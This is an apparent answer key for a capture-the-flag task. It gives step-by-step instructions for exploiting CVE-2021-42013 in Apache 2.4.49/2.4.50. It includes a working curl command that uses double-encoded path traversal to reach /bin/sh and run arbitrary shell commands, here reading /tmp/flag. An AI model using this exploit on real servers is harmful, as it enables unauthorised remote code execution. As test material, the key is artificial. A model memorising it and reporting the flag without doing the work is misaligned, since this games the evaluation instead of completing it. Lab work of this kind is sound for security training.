# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Apache HTTP Server 2.4.49/2.4.50 path traversal → RCE via `mod_cgi`
(CVE-2021-42013). A double-encoded `..` (`.%%32%65` → `%2e` → `.`) escapes the
cgi-bin alias to `/bin/sh`, which runs the POST body as a shell script. The body
emits a CGI `Content-Type` header + blank line (so Apache accepts the response)
then reads the flag at `/tmp/flag`.

1. **Send the traversal-to-`/bin/sh` POST** (`--path-as-is` stops curl
   normalizing the traversal):

   ```
   curl -s --path-as-is --noproxy '*' -X POST \
     "http://<target>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
     -H "Content-Type: text/plain" \
     -d "echo Content-Type: text/plain; echo; cat /tmp/flag"
   ```

2. **Extract the flag** (`FLAG{...}`) from the command output in the response and
   report it verbatim.
